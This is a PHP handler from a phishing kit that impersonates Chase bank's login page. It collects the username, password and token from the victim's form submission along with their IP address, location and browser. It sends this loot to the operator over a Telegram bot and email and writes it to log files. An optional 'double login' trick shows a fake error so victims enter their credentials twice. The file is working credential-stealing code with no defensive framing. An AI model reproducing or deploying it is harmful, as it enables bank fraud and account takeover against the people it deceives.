<?php
ob_start();
session_start();
error_reporting(0);
include'../../spox_bot.php';
include'../../check.php';
if (empty($_GET['token'])) {
   exit(header("Location: ../../login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
if (!empty($_POST['_csrf'])) {

$resulta  = "+ --------------[ CHASE SPOX X BEEMS]---------------+\n";
$resulta .= "[User ID]: ".$_POST['username']."\n";
$resulta .= "[Password]: ".$_POST['password']."\n";
if(!empty($_POST['token'])){ $resulta.="Token  : {$_POST['token']}\r\n"; }
$resulta .= "+ --------------[ VICTEM INFO ]---------------+\n";
$resulta .= "IP Address: ".$ip_spox."\n";
$resulta .= "Country: ".$country_spox."\n";
$resulta .= "City: ".$city_spox."\n";
$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
$resulta .= "User Agent: ".$_SESSION['platform']."\n";
$resulta .= "+ --------------[ CHASE V5 ]---------------+\n";
kirim_tele($telegram_bot_token, $telegram_chat_id);

$subject = "#CHASE SPOX LOGIN: [{$_POST['username']}] [ {$country_spox} - {$_SESSION['browser']} - {$ip_spox} ]";
$headers="From: CHASE SPOX V5 <".$sendfrom.">\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
if($send_result == "on"){
    @mail($email,$subject,$resulta,$headers);
}if($text_result == "on"){
    text_spox2("../../admin/result/logs".$resultpin.".txt",$resulta);
    text_spox2("../../admin/result/bulklogs".$resultpin.".txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_POST['username']." | ".$_POST['password']." | ".date("d/m/Y h:i:sa")."\r\n");
}
$_SESSION['LOGIN_SESSION'] = "LOGIN_SESSION";
if($double_login == "on"){
        if (!isset($_POST['invalid'])) {
          exit(header("Location: ../../login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired&invalid=login"));
        }else{
          exit(header("Location: ../../overview?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
        }
}else{
  exit(header("Location: ../../overview?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}

}else{
      exit(header("Location: ../../login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
?>